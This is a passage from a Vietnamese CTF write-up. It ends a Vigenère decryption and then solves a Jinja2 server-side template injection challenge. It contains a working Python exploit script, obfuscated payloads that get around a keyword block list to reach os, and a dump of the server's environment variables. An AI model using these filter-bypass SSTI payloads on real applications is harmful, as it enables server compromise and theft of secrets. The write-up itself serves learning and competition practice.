<h4 id="Buoc-5-Chuan-hoa-flag"><a href="#Buoc-5-Chuan-hoa-flag" class="headerlink" title="B∆∞·ªõc 5: Chu·∫©n ho√° flag"></a>B∆∞·ªõc 5: Chu·∫©n ho√° flag</h4><p>Theo y√™u c·∫ßu: - Vi·∫øt th∆∞·ªùng - B·ªè d·∫•u ti·∫øng Vi·ªát - Thay d·∫•u c√°ch b·∫±ng <code>_</code></p>
<p>K·∫øt qu·∫£:</p>
<pre><code>HOLACTF&#123;krische_dung_dung&#125;
</code></pre>
<hr>
<h4 id="Script-giai-ma-Python"><a href="#Script-giai-ma-Python" class="headerlink" title="Script gi·∫£i m√£ (Python)"></a>Script gi·∫£i m√£ (Python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> unicodedata, re</span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">&quot;bcdƒëghklmnpqrstvxa√°√†·∫£√£·∫°ƒÉ·∫Ø·∫±·∫≥·∫µ·∫∑√¢·∫•·∫ß·∫©·∫´·∫≠e√©√®·∫ª·∫Ω·∫π√™·∫ø·ªÅ·ªÉ·ªÖ·ªái√≠√¨·ªâƒ©·ªão√≥√≤·ªè√µ·ªç√¥·ªë·ªì·ªï·ªó·ªô∆°·ªõ·ªù·ªü·ª°·ª£u√∫√π·ªß≈©·ª•∆∞·ª©·ª´·ª≠·ªØ·ª±y√Ω·ª≥·ª∑·ªπ·ªµ&quot;</span></span><br><span class="line">idx = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(ALPHABET)&#125;</span><br><span class="line">N = <span class="built_in">len</span>(ALPHABET)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere</span>(<span class="params">text, key, decrypt=<span class="literal">False</span></span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> key <span class="keyword">if</span> ch <span class="keyword">in</span> idx)</span><br><span class="line">    out, j = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> idx:</span><br><span class="line">            <span class="keyword">if</span> decrypt:</span><br><span class="line">                out.append(ALPHABET[(idx[c] - idx[key[j % <span class="built_in">len</span>(key)])] % N])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                out.append(ALPHABET[(idx[c] + idx[key[j % <span class="built_in">len</span>(key)])] % N])</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.append(c)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ƒê·ªçc ciphertext</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;attachment&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;phuthuyphuthuy&quot;</span></span><br><span class="line">plain = vigenere(cipher, key, decrypt=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>

<p>Flag: <code>HOLACTF&#123;krische_dung_dung&#125;</code></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="WEB-Magic-random"><a href="#WEB-Magic-random" class="headerlink" title="WEB - Magic random"></a>WEB - Magic random</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Author</span><br><span class="line">ductohno</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">Ph√©p thu·∫≠t ch∆∞a bao gi·ªù l√† con ƒë∆∞·ªùng b·∫±ng ph·∫≥ng. Ch·ªâ khi ki√™n ƒë·ªãnh b∆∞·ªõc qua m·ªçi th·ª≠ th√°ch, b·∫°n m·ªõi c√≥ th·ªÉ g·∫ßy d·ª±ng n√™n m·ªôt ph√°p thu·∫≠t mang b·∫£n s·∫Øc ri√™ng c·ªßa ch√≠nh m√¨nh.</span><br></pre></td></tr></table></figure>

<h4 id="Tong-quan-1"><a href="#Tong-quan-1" class="headerlink" title="T·ªïng quan"></a>T·ªïng quan</h4><p>Trong <code>/api/cast_attack</code>, khi <code>attack_name</code> kh√¥ng tr√πng key h·ª£p l·ªá th√¨ server s·∫Ω ho·∫°t ƒë·ªông:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attack_name = valid_template(attack_name)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> special_filter(attack_name):</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Creating magic is failed&quot;</span>&#125;), <span class="number">404</span></span><br><span class="line">template = render_template_string(<span class="string">&quot;&lt;i&gt;No magic name &quot;</span>+attack_name+<span class="string">&quot; here, try again!&lt;/i&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: template&#125;), <span class="number">404</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>attack_name</code> ƒë∆∞·ª£c n·ªëi chu·ªói tr·ª±c ti·∫øp v√†o template v√† render b·∫±ng Jinja2 d·∫´n ƒë·∫øn c√≥ th·ªÉ SSTI.</li>
<li><code>GET /api/cast_attack?attack_name=&#123;&#123;70-21&#125;&#125;</code> tr·∫£ v·ªÅ ‚ÄúNo magic name <code>0&#123;&#125;-2&#125;&#123;71</code> here‚Ä¶‚Äù.<ul>
<li>G·ª≠i th√¥ <code>&#123;&#123;70-21&#125;&#125;</code> th√¨ s·∫Ω b·ªã server x√°o k√Ω t·ª± tr∆∞·ªõc khi render l√∫c ƒë√≥ template nh·∫≠n chu·ªói ƒë√£ b·ªã ƒë·∫£o (<code>0&#123;&#125;-2&#125;&#123;71</code>), kh√¥ng th·ª±c thi payload ƒë∆∞·ª£c n√™n server tr·∫£ v·ªÅ ch√≠nh chu·ªói b·ªã ƒë·∫£o trong th√¥ng b√°o.</li>
</ul>
</li>
<li>N·∫øu g·ª≠i <strong>preimage</strong> c·ªßa bi·ªÉu th·ª©c (v√≠ d·ª• <code>&#123;1&#125;&#123;0-&#125;72</code> cho ƒë·ªô d√†i 8) th√¨ server x√°o xong m·ªõi kh·ªõp l·∫°i th√†nh <code>&#123;&#123;70-21&#125;&#125;</code> l√∫c ƒë√≥ Jinja th·ª±c thi v√† m√¨nh s·∫Ω th·∫•y output l√† <code>49</code>.</li>
</ul>
<h4 id="Khai-thac"><a href="#Khai-thac" class="headerlink" title="Khai th√°c"></a>Khai th√°c</h4><p>Script ƒë·ªÉ g·ª≠i <strong>preimage</strong> cho bi·ªÉu th·ª©c SSTI:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, math, argparse, requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffled_of</span>(<span class="params">api, probe: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    r = requests.get(api, params=&#123;<span class="string">&quot;attack_name&quot;</span>: probe&#125;)</span><br><span class="line">    j = r.json()</span><br><span class="line">    m = re.search(<span class="string">r&quot;No magic name (.+?) here&quot;</span>, j.get(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> m:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(j.get(<span class="string">&quot;error&quot;</span>, j))</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ALPH = <span class="string">&quot;_0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_probe</span>(<span class="params">n: <span class="built_in">int</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    arr = [ALPH[(i // (<span class="number">10</span>**k)) % <span class="number">10</span> + <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="string">&quot;_&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer_perm</span>(<span class="params">api, n: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">range</span>(n))</span><br><span class="line">    m = math.ceil(math.log10(n))</span><br><span class="line">    probes = [build_probe(n, k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">    outs = [shuffled_of(api, p) <span class="keyword">for</span> p <span class="keyword">in</span> probes]</span><br><span class="line">    perm = [<span class="literal">None</span>]*n</span><br><span class="line">    <span class="keyword">for</span> newpos <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        i, zero = <span class="number">0</span>, <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            ch = outs[k][newpos]</span><br><span class="line">            <span class="keyword">if</span> ch != <span class="string">&quot;_&quot;</span>:</span><br><span class="line">                zero = <span class="literal">False</span></span><br><span class="line">                digit = ALPH.index(ch) - <span class="number">1</span></span><br><span class="line">                i += digit * (<span class="number">10</span>**k)</span><br><span class="line">        <span class="keyword">if</span> zero:</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= n:</span><br><span class="line">            i %= n</span><br><span class="line">        perm[i] = newpos</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(v <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> v <span class="keyword">in</span> perm):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;perm inference failed&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> perm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preimage</span>(<span class="params">api, target: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    perm = infer_perm(api, <span class="built_in">len</span>(target))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(target[j] <span class="keyword">for</span> j <span class="keyword">in</span> perm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">api, target: <span class="built_in">str</span></span>):</span><br><span class="line">    s = preimage(api, target)</span><br><span class="line">    r = requests.get(api, params=&#123;<span class="string">&quot;attack_name&quot;</span>: s&#125;)</span><br><span class="line">    <span class="keyword">return</span> s, r.json().get(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ap = argparse.ArgumentParser()</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--base&quot;</span>, default=<span class="string">&quot;http://127.0.0.1:51412&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;http://host:port&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--expr&quot;</span>, default=<span class="string">&quot;&#123;&#123;70-21&#125;&#125;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Jinja2 payload ƒë√≠ch&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--dry&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Ch·ªâ in preimage, kh√¥ng g·ª≠i&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    API = <span class="string">f&quot;<span class="subst">&#123;args.base.rstrip(<span class="string">&#x27;/&#x27;</span>)&#125;</span>/api/cast_attack&quot;</span></span><br><span class="line">    s = preimage(API, args.expr)</span><br><span class="line">    <span class="keyword">if</span> args.dry:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;preimage:&quot;</span>, s)</span><br><span class="line">        <span class="built_in">print</span>(requests.get(API, params=&#123;<span class="string">&quot;attack_name&quot;</span>: s&#125;).json().get(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>ƒê·ªçc source code s·∫Ω th·∫•y v·ªõi filter n√†y th√¨ m√¨nh b·ªã ch·∫∑n kh√° nhi·ªÅu ·ªü payload, m√¨nh b·ªã ch·∫∑n <code>import</code>, <code>os</code> l·∫´n <code>sys</code> ·ªü payload tr·ª±c ti·∫øp, nh·ªØng c√°i r·∫•t quan tr·ªçng ƒë·ªÉ ƒë·ªçc flag, n√™n m√¨nh s·∫Ω nghƒ© c√°ch ƒë·ªÉ c√≥ th·ªÉ lu·ªìn qua v√† g·ªçi ch√∫ng, t·∫•t nhi√™n l√† s·∫Ω ph·∫£i d√πng c√°ch c·ªông chu·ªói l√† ƒë·∫ßu ti√™n:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">special_filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    simple_filter=[<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;attr&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;builtins&quot;</span>, <span class="string">&quot;class&quot;</span>, <span class="string">&quot;subclass&quot;</span>, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;sessions&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;templat&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;wrapper&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;cli&quot;</span>, <span class="string">&quot;blueprints&quot;</span>, <span class="string">&quot;signals&quot;</span>, <span class="string">&quot;typing&quot;</span>, <span class="string">&quot;ctx&quot;</span>, <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;base&quot;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;g.&quot;</span>, <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;application&quot;</span>, <span class="string">&quot;render&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> char_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(simple_filter)):</span><br><span class="line">        <span class="keyword">if</span> simple_filter[char_num] <span class="keyword">in</span> user_input.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>ƒê√¢y l√† c√°ch gi·∫£i c·ªßa m√¨nh:</p>
<ol>
<li>T√¨m xem c√≥ <code>typing</code> kh√¥ng:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;session.__init__.__globals__.t.__repr__()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;session.__init__.__globals__.t.__repr__()&#125;&#125;&quot;</span></span><br><span class="line">preimage: bae&#125;i&#125;stl&#123;_o_p_sr.___.s(n_n_l__o.e.gi_s&#123;rt_)i</span><br><span class="line">&lt;i&gt;No magic name &amp;lt;module &amp;<span class="comment">#39;typing&amp;#39; from &amp;#39;/usr/local/lib/python3.12/typing.py&amp;#39;&amp;gt; here, try again!&lt;/i&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>V·∫≠y l√† c√≥ <code>typing.py</code> ·ªü <code>/usr/local/lib/python3.12/typing.py</code>.</li>
</ul>
<ol start="2">
<li>L·∫•y <code>sys</code> qua <code>typing.__dict__[&#39;sys&#39;]</code>:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).__repr__()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).__repr__()&#125;&#125;&quot;</span></span><br><span class="line">preimage: <span class="function">[<span class="type">dnre</span>&lt;<span class="type">ne3_</span>(<span class="type">._a</span>&#125;)&gt;)<span class="type">to</span>&#123;)<span class="type">_</span>&#125;<span class="type">d.sil</span>]__<span class="title">s</span></span>(&gt;_i___])<span class="number">3</span>_52_nlg_to_r_dtcd(._<span class="literal">-piieraon__inr3r</span>()_3)_s_d)o_a(<span class="built_in">r</span>&#123;)_.__3o].b(d()s).n__e(s1_.sn)b[<span class="type">ii_e</span>[(<span class="type">.a</span>)<span class="type">.t</span>[<span class="type">.</span>(<span class="type">.sp</span>&lt;((<span class="type">__...s5a_ed2_i_a_</span>]<span class="type">_t_r_3i_cs</span>)<span class="type">_p_p_gg__</span>(<span class="type">l_l</span></span><br><span class="line">&lt;<span class="type">i</span>&gt;<span class="type">No</span> <span class="type">magic</span> <span class="type">name</span> &amp;<span class="type">lt</span>;<span class="type">module</span> &amp;<span class="comment">#39;sys&amp;#39; (built-in)&amp;gt; here, try again!&lt;/i&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>L·∫•y <code>os</code> qua <code>sys.modules[&#39;os&#39;]</code>:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3&gt;5)and(2&lt;3)).__repr__()[3]))].__repr__()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3&gt;5)and(2&lt;3)).__repr__()[3]))].__repr__()&#125;&#125;&quot;</span></span><br><span class="line">preimage: _snrlo&gt;.__)_&gt;d.<span class="number">5</span>pe)(_n_.(_o)&#125;i_bes(ii_b_]rd)(a&#125;ca_)s&gt;)et).(<span class="number">5</span>)ldnr3t_e3nns3_s3___.<span class="number">3</span>(((&#123;_d.d(t_)__d&lt;_e]ae(.o)i2.)_.r_il__)p_(l)o](pr(de((e_5r_i_mnno_a_&#123;_)o._pd_s_e&lt;a)ro).]ersd_.s]_an.__r([<span class="type">n3</span>]_guip.[[()<span class="type">s</span>[<span class="number">2</span>&lt;<span class="type">.</span>-<span class="number">3</span><span class="type">t_.pi</span>[<span class="type">____1</span>]<span class="type">a</span>[)(<span class="type">_a31_g</span>(<span class="type">_rl3t</span>))(<span class="type">ci_</span>()<span class="number">2</span><span class="type">._dgd_</span>(<span class="type">_</span>)<span class="type">sr.</span>[<span class="type">__n__</span></span><br><span class="line">&lt;<span class="type">i</span>&gt;<span class="type">No</span> <span class="type">magic</span> <span class="type">name</span> &amp;<span class="type">lt</span>;<span class="type">module</span> &amp;<span class="comment">#39;os&amp;#39; (frozen)&amp;gt; here, try again!&lt;/i&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>ƒê·ªçc <code>ENV</code>:</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3&gt;5)and(2&lt;3)).__repr__()[3]))].environ.__repr__()&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\biscuit\Downloads\magic_random&gt; &amp; C:/Users/biscuit/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">10</span>.exe c:/Users/biscuit/Downloads/magic_random/exploit1.py <span class="literal">--expr</span> <span class="string">&quot;&#123;&#123;(session.__init__.__globals__.t.__dict__[(((3&gt;5)and(2&lt;3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3&gt;5)and(2&lt;3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3&gt;5)and(2&lt;3)).__repr__()[3]))].environ.__repr__()&#125;&#125;&quot;</span></span><br><span class="line">preimage: e(._.<span class="function">[<span class="type">_e_v</span>-<span class="type">s2s_3g</span>]<span class="title">e_o</span></span>.e___.)&#125;)_.ri)sl3b.ea_))p&#125;l)pa_(__n<span class="function">[<span class="type">_nret3</span>))<span class="type">i_tr</span>(<span class="type">_</span>(<span class="type">tids_.smlra.s</span>)<span class="type">__c__.2..n</span>&#123;<span class="number">3</span><span class="type">_</span>((<span class="type">__i</span>(&gt;&gt;<span class="type">ep</span>(<span class="type">ipnl</span>)<span class="type">nrs</span>]]<span class="title">d</span></span><span class="function">[<span class="type">o_</span>()<span class="type">__r</span>)<span class="number">3</span>())<span class="type">_</span>[<span class="number">5</span><span class="type">__donnr</span>)<span class="type">.2</span>&lt;<span class="type">._</span>)<span class="type">_</span>&#123;<span class="type">o.</span>(<span class="type">a_</span>(<span class="type">rta3_</span>)(<span class="number">31</span>(<span class="type">e__d</span>(]<span class="type">t_i</span>&gt;<span class="type">e_</span>[<span class="type">..</span>(<span class="type">e3_3</span>)<span class="type">.s___</span>(<span class="type">pa_</span>[<span class="type">r_</span>(<span class="number">5</span><span class="type">_oi</span>]<span class="type">n._dpd1e.__b_dn</span>]<span class="type">_r</span>(<span class="type">n</span>)<span class="number">5</span><span class="type">is</span>]_<span class="title">so_n</span></span>)(d&lt;(c&lt;dlr(_odad_r__i))[<span class="type">ounggai</span></span><br><span class="line">&lt;<span class="type">i</span>&gt;<span class="type">No</span> <span class="type">magic</span> <span class="type">name</span> <span class="type">environ</span>(&#123;&amp;<span class="comment">#39;KUBERNETES_SERVICE_PORT&amp;#39;: &amp;#39;443&amp;#39;, &amp;#39;KUBERNETES_PORT&amp;#39;: &amp;#39;tcp://10.100.0.1:443&amp;#39;, &amp;#39;HOSTNAME&amp;#39;: &amp;#39;magic-random-ea5710c0c1194be0&amp;#39;, &amp;#39;PYTHON_PIP_VERSION&amp;#39;: &amp;#39;24.0&amp;#39;, &amp;#39;SHLVL&amp;#39;: &amp;#39;1&amp;#39;, &amp;#39;HOME&amp;#39;: &amp;#39;/app&amp;#39;, &amp;#39;GPG_KEY&amp;#39;: &amp;#39;7169605F62C751356D054A26A821E680E5FA6305&amp;#39;, &amp;#39;PYTHON_GET_PIP_URL&amp;#39;: &amp;#39;https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py&amp;#39;, &amp;#39;KUBERNETES_PORT_443_TCP_ADDR&amp;#39;: &amp;#39;10.100.0.1&amp;#39;, &amp;#39;PATH&amp;#39;: &amp;#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#39;, &amp;#39;KUBERNETES_PORT_443_TCP_PORT&amp;#39;: &amp;#39;443&amp;#39;, &amp;#39;KUBERNETES_PORT_443_TCP_PROTO&amp;#39;: &amp;#39;tcp&amp;#39;, &amp;#39;LANG&amp;#39;: &amp;#39;C.UTF-8&amp;#39;, &amp;#39;PYTHON_VERSION&amp;#39;: &amp;#39;3.12.2&amp;#39;, &amp;#39;KUBERNETES_SERVICE_PORT_HTTPS&amp;#39;: &amp;#39;443&amp;#39;, &amp;#39;KUBERNETES_PORT_443_TCP&amp;#39;: &amp;#39;tcp://10.100.0.1:443&amp;#39;, 